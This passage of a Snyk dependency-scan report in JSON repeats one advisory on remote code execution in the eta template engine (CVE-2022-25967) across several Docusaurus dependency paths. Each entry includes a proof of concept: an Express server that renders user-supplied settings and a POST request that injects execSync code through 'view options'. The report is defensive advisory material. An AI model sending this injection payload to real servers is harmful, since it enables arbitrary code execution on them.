        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-debug@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-analytics@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-google-analytics@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-gtag@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-google-gtag@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-sitemap@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-sitemap@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
